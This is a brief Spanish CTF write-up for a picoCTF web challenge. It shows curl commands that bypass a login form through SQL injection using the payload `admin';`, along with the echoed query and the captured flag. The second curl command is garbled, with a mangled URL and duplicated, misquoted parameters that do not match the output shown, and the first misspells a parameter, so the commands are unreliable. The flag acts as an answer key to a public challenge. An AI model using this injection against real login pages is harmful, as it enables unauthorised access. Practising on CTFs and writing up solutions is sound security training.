## Descripción 
```
There is a website running at `https://jupiter.challenges.picoctf.org/problem/53751/` ([link](https://jupiter.challenges.picoctf.org/problem/53751/)). Someone has bypassed the login before, and now it's being strengthened. Try to see if you can still login! or http://jupiter.challenges.picoctf.org:53751
```
[](https://github.com/armandoportillo0101/Seguridad-de-Redes/blob/main/Plantilla.md#objetivo)
## Solución
```bash
porti_04@DESKTOP-8HT902T:~$ curl -s  https://jupiter.challenges.picoctf.org/problem/53751/login.php -d "username-admin&password=password&debug=1"
<pre>username:
password: password
SQL query: SELECT * FROM users WHERE name='' AND password='password'
</pre><h1>Login failed.</h1>porti_04@DESKTOP-8HT902T:~$ curl -s  https://jupiter.challenges.picoctf.org"username=admin';&password=password&debug=1";&password=password&debug=1"
<pre>username: admin';
password: password
SQL query: SELECT * FROM users WHERE name='admin';' AND password='password'
</pre><h1>Logged in!</h1><p>Your flag is: picoCTF{m0R3_SQL_plz_c34df170}</p>porti_04@DESKTOP-8HT902T:~$

flag: picoCTF{m0R3_SQL_plz_c34df170}
```
[](https://github.com/armandoportillo0101/Seguridad-de-Redes/blob/main/Plantilla.md#soluci%C3%B3n)

## Notas Adicionales

[](https://github.com/armandoportillo0101/Seguridad-de-Redes/blob/main/Plantilla.md#notas-adicionales)

### Referencias